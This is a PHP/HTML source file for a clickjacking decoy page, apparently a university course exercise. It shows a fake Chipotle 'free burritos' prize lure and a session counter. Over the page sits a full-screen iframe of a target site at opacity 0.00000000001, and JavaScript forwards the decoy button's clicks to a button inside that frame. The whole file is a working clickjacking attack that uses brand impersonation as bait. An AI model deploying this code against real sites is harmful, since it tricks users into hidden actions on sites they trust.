<!-- start session for counter session variable (stores value across multiple pages) -->
<?php
session_start();
if (!isset($_SESSION["state"])) {
  $_SESSION["state"] = 0;
}
?>

<!-- HTML style code for decoy webpage -->
<html>
  <style>
      h1 {
        text-align: center;
      }

      #target {
        position: absolute;
        width: 100%;
        height: 100%;
        opacity: 0.00000000001;
      }

      div {
	position: relative;
      }

      button {
        position: relative;
        margin-top:5%;
        margin-left:46%;
        padding: 10px 20px;
      }

      #text {
        text-align: center;
      }

      #image {
        position: relative;
        display: block;
        margin-left: 42%;
        margin-top: 5%;
        width: 30%;
      }

  </style>

  <head>
    <title> Decoy </title>
  </head>

  <body>
    <!-- iframe of invisible target website -->
    <iframe id="target" src="http://cs.williams.edu/~24fka1/attacksite.php"></iframe>

    <div>
      <body>
        <h1 style="color:#441500"> Congratulations! </h1>

        <div id="text" style="color:#AC2318"> Your neighborhood Chipotle is offering you a one time chance to win as many burritos as you can!</div><br>

       <div id="text" style="color:#AC2318">
        <!-- display the fake value of the counter (free Chipotle burritos) -->
        <?php
	echo "You've won ".$_SESSION["state"]." free Chipotle burritos! CLICK THE BUTTON FOR MORE!";
        ?>
       </div>

       <div id="image">
         <img src="chipotle.png">
       </div>

          <!-- decoy button that redirects clicks to button on target webpage -->
          <button type="button" id="decoybutton" onClick="window.location.reload(), iframeClick()">MORE BURRITOS!</button><br><br>
      <div id="text" style="color:#441500"> Follow this <a href="http://cs.williams.edu/~24fka1/attacksite.php">link</a> to claim your free burritos.
      </body>
    </div>

    <!-- JavaScript for the clickjacking attack that redirects button clicks -->
    <script>
      function iframeClick() {
        document.getElementById("target").contentWindow.document.getElementById("targetbutton").click();
      }
    </script>

  </body>
</html>
